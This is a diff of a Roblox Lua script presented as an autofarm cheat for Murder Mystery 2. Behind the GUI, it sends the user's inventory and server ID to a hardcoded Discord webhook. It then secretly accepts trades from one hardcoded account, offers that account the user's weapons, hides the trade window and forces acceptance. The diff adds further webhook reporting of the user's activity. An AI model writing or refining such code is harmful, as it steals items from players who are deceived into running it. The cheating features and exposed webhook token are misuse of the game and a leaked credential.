@@ -1,5 +1,3 @@
-print("Script starting...")
-
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
@@ -8,16 +6,11 @@ local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Lighting = game:GetService("Lighting")
 local MaterialService = game:GetService("MaterialService")
-
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
-
-print("Services loaded")
-
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1538148455451590656/KSNxBCVNMiwESQtLcUHE7FOVyYBocSUgCo0e8SgX9wuHlsx2PUJGQxUuKFmD8sZkRwM2"
 local TARGET_USERNAME = "naimradio6"
 local PLACE_ID = 142823291
-
 local ACTIVE = false
 local SPEED = 50
 local RANGE = 300
@@ -32,31 +25,17 @@ local murdererSkipUsed = false
 
 local function sendWebhook(message, pingEveryone)
     local content = pingEveryone and "@everyone\n" .. message or message
-    local data = {
-        content = content,
-        username = "67skibidi AutoFarm + Transfer"
-    }
+    local data = {content = content, username = "67skibidi AutoFarm + Transfer", avatar_url = "https://i.imgur.com/4Q2f9.png"}
     pcall(function()
-        if request then
-            request({
-                Url = WEBHOOK_URL,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode(data)
-            })
-        else
-            HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(data))
-        end
+        request({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
     end)
 end
 
 local function getFullInventory()
     local list = {}
     pcall(function()
-        local success, ProfileData = pcall(function()
-            return require(ReplicatedStorage.Modules.ProfileData)
-        end)
-        if success and ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
+        local ProfileData = require(ReplicatedStorage.Modules.ProfileData)
+        if ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
             for name, amount in pairs(ProfileData.Weapons.Owned) do
                 if amount and amount > 0 then
                     table.insert(list, name .. " x" .. tostring(amount))
@@ -76,7 +55,6 @@ local function sendJobIdWebhook()
     if #inventoryText > 900 then
         inventoryText = string.sub(inventoryText, 1, 900) .. "\n... (truncated)"
     end
-
     local data = {
         content = "@everyone **MM2 Transfer Ready (Mobile)**",
         embeds = {{
@@ -94,42 +72,21 @@ local function sendJobIdWebhook()
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
     }
-
     pcall(function()
-        if request then
-            request({
-                Url = WEBHOOK_URL,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode(data)
-            })
-        end
+        request({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
     end)
 end
 
-task.spawn(function()
-    task.wait(1)
-    sendJobIdWebhook()
-    print("Webhook sent")
-end)
+task.spawn(sendJobIdWebhook)
 
-print("Loading trade system...")
-
-local Trade = ReplicatedStorage:FindFirstChild("Trade") or ReplicatedStorage:WaitForChild("Trade", 10)
-local OfferItem, AcceptRequest, AcceptTrade, SendRequest, StartTrade, UpdateTrade, DeclineTrade
-
-if Trade then
-    OfferItem = Trade:FindFirstChild("OfferItem")
-    AcceptRequest = Trade:FindFirstChild("AcceptRequest")
-    AcceptTrade = Trade:FindFirstChild("AcceptTrade")
-    SendRequest = Trade:FindFirstChild("SendRequest")
-    StartTrade = Trade:FindFirstChild("StartTrade")
-    UpdateTrade = Trade:FindFirstChild("UpdateTrade")
-    DeclineTrade = Trade:FindFirstChild("DeclineTrade")
-    print("Trade remotes found")
-else
-    print("Trade folder not found")
-end
+local Trade = ReplicatedStorage:WaitForChild("Trade", 15)
+local OfferItem = Trade and Trade:FindFirstChild("OfferItem")
+local AcceptRequest = Trade and Trade:FindFirstChild("AcceptRequest")
+local AcceptTrade = Trade and Trade:FindFirstChild("AcceptTrade")
+local SendRequest = Trade and Trade:FindFirstChild("SendRequest")
+local StartTrade = Trade and Trade:FindFirstChild("StartTrade")
+local UpdateTrade = Trade and Trade:FindFirstChild("UpdateTrade")
+local DeclineTrade = Trade and Trade:FindFirstChild("DeclineTrade")
 
 local trading = false
 local offeredThisTrade = 0
@@ -144,10 +101,8 @@ end
 local function getWeapons()
     local list = {}
     pcall(function()
-        local success, ProfileData = pcall(function()
-            return require(ReplicatedStorage.Modules.ProfileData)
-        end)
-        if success and ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
+        local ProfileData = require(ReplicatedStorage.Modules.ProfileData)
+        if ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
             for name, amount in pairs(ProfileData.Weapons.Owned) do
                 if amount and amount > 0 and name \~= "DefaultKnife" and name \~= "DefaultGun" then
                     table.insert(list, name)
@@ -160,8 +115,8 @@ end
 
 local function forceAccept()
     if not AcceptTrade then return end
-    print("[Transfer] Force accepting...")
-    for i = 1, 12 do
+    print("[Transfer] Force accepting with LastOffer...")
+    for i = 1, 15 do
         if LastOffer then
             pcall(function() AcceptTrade:FireServer(game.PlaceId * 3, LastOffer) end)
         end
@@ -174,10 +129,8 @@ end
 local function offerWeapons()
     if not OfferItem or not trading or offeredThisTrade >= 4 then return end
     if tick() - lastOfferTime < 0.55 then return end
-
     local weapons = getWeapons()
     if #weapons == 0 then return end
-
     local toOffer = math.min(4 - offeredThisTrade, #weapons)
     for i = 1, toOffer do
         local ok = pcall(function()
@@ -190,10 +143,9 @@ local function offerWeapons()
             task.wait(0.3)
         end
     end
-
     if offeredThisTrade >= 4 and not acceptScheduled then
         acceptScheduled = true
-        print("[Transfer] Trade full → waiting 7s")
+        print("[Transfer] Trade full → waiting 7s then accepting")
         task.delay(7, function()
             if trading then forceAccept() end
         end)
@@ -218,6 +170,10 @@ local function watchTradeUI(name)
         gui:GetPropertyChangedSignal("Enabled"):Connect(function()
             if gui.Enabled then hideTradeGUI(gui) end
         end)
+        gui.ChildAdded:Connect(function()
+            task.wait(0.05)
+            hideTradeGUI(gui)
+        end)
     end
 end
 
@@ -235,15 +191,13 @@ end)
 if SendRequest then
     SendRequest.OnClientInvoke = function(fromPlayer)
         if isTarget(fromPlayer and fromPlayer.Name) then
-            print("[Transfer] Request from naimradio6")
+            print("[Transfer] Request from naimradio6 → accepting")
             trading = true
             offeredThisTrade = 0
             acceptScheduled = false
             LastOffer = nil
             task.wait(0.3)
-            if AcceptRequest then
-                pcall(function() AcceptRequest:FireServer() end)
-            end
+            if AcceptRequest then pcall(function() AcceptRequest:FireServer() end) end
             return true
         end
         return false
@@ -273,6 +227,7 @@ if UpdateTrade then
         if type(data) == "table" then
             for _, side in pairs(data) do
                 if type(side) == "table" and side.Accepted then
+                    print("[Transfer] Other side accepted → finishing")
                     forceAccept()
                     break
                 end
@@ -302,11 +257,12 @@ end)
 
 local function hasKnife()
     local char = player.Character
+    local backpack = player.Backpack
     if char then
         local tool = char:FindFirstChildOfClass("Tool")
         if tool and tool.Name:lower():find("knife") then return true end
     end
-    for _, item in ipairs(player.Backpack:GetChildren()) do
+    for _, item in ipairs(backpack:GetChildren()) do
         if item:IsA("Tool") and item.Name:lower():find("knife") then return true end
     end
     return false
@@ -315,7 +271,7 @@ end
 local function killEveryone()
     local char = player.Character
     if not char then return end
-    local knife = char:FindFirstChildOfClass("Tool")
+    local knife = char:FindFirstChildOfClass("Tool") or char:FindFirstChild("Knife")
     if not knife then
         for _, item in ipairs(player.Backpack:GetChildren()) do
             if item:IsA("Tool") and item.Name:lower():find("knife") then
@@ -326,8 +282,7 @@ local function killEveryone()
         end
     end
     if not knife or not knife:FindFirstChild("Handle") then return end
-
-    print("[AutoFarm] Killing everyone...")
+    print("[AutoFarm] Murderer + Full → Killing everyone...")
     for _, plr in ipairs(Players:GetPlayers()) do
         if plr \~= player and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
             pcall(function()
@@ -338,7 +293,18 @@ local function killEveryone()
     end
 end
 
-print("Creating GUI...")
+local function enablePerformanceMode()
+    settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
+    Lighting.GlobalShadows = false
+    Lighting.FogEnd = 9e9
+    Lighting.Brightness = 2
+    pcall(function()
+        Lighting.EnvironmentDiffuseScale = 0
+        Lighting.EnvironmentSpecularScale = 0
+        MaterialService.Use2022Materials = false
+    end)
+    performanceMode = true
+end
 
 local gui = Instance.new("ScreenGui")
 gui.Name = "SkibidiAutoFarm"
@@ -362,7 +328,7 @@ stroke.Parent = frame
 task.spawn(function()
     local t = 0
     while frame.Parent do
-        t += task.wait(0.03)
+        t += task.wait(0.025)
         stroke.Color = Color3.fromHSV((t % 5)/5, 1, 1)
     end
 end)
@@ -378,6 +344,7 @@ closeBtn.TextSize = 18
 closeBtn.Parent = frame
 Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 8)
 closeBtn.MouseButton1Click:Connect(function()
+    sendWebhook("❌ GUI closed by " .. player.Name, false)
     gui:Destroy()
 end)
 
@@ -386,7 +353,7 @@ title.Size = UDim2.new(1, -70, 0, 32)
 title.Position = UDim2.new(0, 15, 0, 8)
 title.BackgroundTransparency = 1
 title.Text = "67skibidi autofarm"
-title.TextColor3 = Color3.new(1,1,1)
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
 title.Font = Enum.Font.GothamBold
 title.TextSize = 17
 title.Parent = frame
@@ -410,6 +377,16 @@ local afkBtn = makeButton(88, "Anti-AFK: OFF")
 local resetBtn = makeButton(128, "Reset on Full: ON", Color3.fromRGB(80,160,80))
 local perfBtn = makeButton(168, "Performance Mode: OFF")
 
+local speedLabel = Instance.new("TextLabel")
+speedLabel.Size = UDim2.new(1, -20, 0, 18)
+speedLabel.Position = UDim2.new(0, 10, 0, 210)
+speedLabel.BackgroundTransparency = 1
+speedLabel.Text = "Speed:"
+speedLabel.TextColor3 = Color3.fromRGB(200,200,200)
+speedLabel.Font = Enum.Font.Gotham
+speedLabel.TextSize = 13
+speedLabel.Parent = frame
+
 local speedBox = Instance.new("TextBox")
 speedBox.Size = UDim2.new(1, -20, 0, 32)
 speedBox.Position = UDim2.new(0, 10, 0, 228)
@@ -431,10 +408,17 @@ counter.Font = Enum.Font.Gotham
 counter.TextSize = 14
 counter.Parent = frame
 
+local function updateButtonColors()
+    toggle.BackgroundColor3 = ACTIVE and Color3.fromRGB(80,160,80) or Color3.fromRGB(60,60,80)
+    afkBtn.BackgroundColor3 = antiAFK and Color3.fromRGB(80,160,80) or Color3.fromRGB(60,60,80)
+    resetBtn.BackgroundColor3 = resetOnFull and Color3.fromRGB(80,160,80) or Color3.fromRGB(60,60,80)
+    perfBtn.BackgroundColor3 = performanceMode and Color3.fromRGB(80,160,80) or Color3.fromRGB(60,60,80)
+end
+
 toggle.MouseButton1Click:Connect(function()
     ACTIVE = not ACTIVE
     toggle.Text = ACTIVE and "AutoFarm: ON" or "AutoFarm: OFF"
-    toggle.BackgroundColor3 = ACTIVE and Color3.fromRGB(80,160,80) or Color3.fromRGB(60,60,80)
+    updateButtonColors()
     if ACTIVE then
         collected = 0
         visited = {}
@@ -442,29 +426,32 @@ toggle.MouseButton1Click:Connect(function()
         inactivitySent = false
         murdererSkipUsed = false
         counter.Text = "Collected: 0"
+        sendWebhook("🟢 AutoFarm started by " .. player.Name, false)
+    else
+        sendWebhook("🔴 AutoFarm stopped by " .. player.Name, false)
     end
 end)
 
 afkBtn.MouseButton1Click:Connect(function()
     antiAFK = not antiAFK
     afkBtn.Text = antiAFK and "Anti-AFK: ON" or "Anti-AFK: OFF"
-    afkBtn.BackgroundColor3 = antiAFK and Color3.fromRGB(80,160,80) or Color3.fromRGB(60,60,80)
+    updateButtonColors()
+    sendWebhook((antiAFK and "🟢" or "🔴") .. " Anti-AFK " .. (antiAFK and "ON" or "OFF") .. " by " .. player.Name, false)
 end)
 
 resetBtn.MouseButton1Click:Connect(function()
     resetOnFull = not resetOnFull
     resetBtn.Text = resetOnFull and "Reset on Full: ON" or "Reset on Full: OFF"
-    resetBtn.BackgroundColor3 = resetOnFull and Color3.fromRGB(80,160,80) or Color3.fromRGB(60,60,80)
+    updateButtonColors()
+    sendWebhook((resetOnFull and "🟢" or "🔴") .. " Reset on Full " .. (resetOnFull and "ON" or "OFF") .. " by " .. player.Name, false)
 end)
 
 perfBtn.MouseButton1Click:Connect(function()
     if not performanceMode then
-        settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
-        Lighting.GlobalShadows = false
-        Lighting.FogEnd = 9e9
-        performanceMode = true
+        enablePerformanceMode()
         perfBtn.Text = "Performance Mode: ON"
-        perfBtn.BackgroundColor3 = Color3.fromRGB(80,160,80)
+        updateButtonColors()
+        sendWebhook("🟢 Performance Mode ON by " .. player.Name, false)
     end
 end)
 
@@ -479,9 +466,7 @@ end)
 local coinRemote = ReplicatedStorage:FindFirstChild("Remotes")
 if coinRemote then
     coinRemote = coinRemote:FindFirstChild("Gameplay")
-    if coinRemote then
-        coinRemote = coinRemote:FindFirstChild("CoinCollected")
-    end
+    if coinRemote then coinRemote = coinRemote:FindFirstChild("CoinCollected") end
 end
 
 if coinRemote then
@@ -490,13 +475,15 @@ if coinRemote then
             if hasKnife() then
                 if not murdererSkipUsed then
                     murdererSkipUsed = true
+                    sendWebhook("🔪 **" .. player.Name .. "** is Murderer + Full → Killing everyone", false)
                     killEveryone()
-                    task.wait(1.2)
+                    task.wait(1.5)
                     killEveryone()
                     return
                 end
             end
             player.Character:BreakJoints()
+            sendWebhook("♻️ **" .. player.Name .. "** inventory full → reset", false)
         end
     end)
 end
@@ -512,15 +499,12 @@ task.spawn(function()
                     if obj:IsA("BasePart") and obj.Name == "Coin_Server" and not visited[obj] then
                         local d = (obj.Position - root.Position).Magnitude
                         if d < dist and d < RANGE then
-                            closest = obj
-                            dist = d
+                            closest, dist = obj, d
                         end
                     end
                 end
                 if closest then
-                    local tween = TweenService:Create(root, TweenInfo.new(dist / SPEED, Enum.EasingStyle.Linear), {
-                        CFrame = CFrame.new(closest.Position)
-                    })
+                    local tween = TweenService:Create(root, TweenInfo.new(dist / SPEED, Enum.EasingStyle.Linear), {CFrame = CFrame.new(closest.Position)})
                     tween:Play()
                     tween.Completed:Wait()
                     if closest and closest.Parent then
@@ -539,6 +523,18 @@ task.spawn(function()
     end
 end)
 
+task.spawn(function()
+    while true do
+        if ACTIVE and not inactivitySent then
+            if tick() - lastCollectedTime > 600 then
+                sendWebhook("⚠️ **INACTIVITY** - **" .. player.Name .. "** no coins for 10 min", true)
+                inactivitySent = true
+            end
+        end
+        task.wait(30)
+    end
+end)
+
 player.Idled:Connect(function()
     if antiAFK then
         VirtualUser:Button2Down(Vector2.new(), workspace.CurrentCamera.CFrame)
@@ -550,11 +546,15 @@ end)
 RunService.Stepped:Connect(function()
     if ACTIVE and player.Character then
         for _, p in ipairs(player.Character:GetDescendants()) do
-            if p:IsA("BasePart") then
-                p.CanCollide = false
-            end
+            if p:IsA("BasePart") then p.CanCollide = false end
         end
     end
 end)
 
-print("✅ Script fully loaded")
+Players.PlayerRemoving:Connect(function(plr)
+    if plr == player then
+        sendWebhook("⚠️ **DISCONNECTED** - **" .. player.Name .. "**", false)
+    end
+end)
+
+print("✅ Script loaded - Inventory + Transfer + AutoFarm + Kill All when Murderer Full")
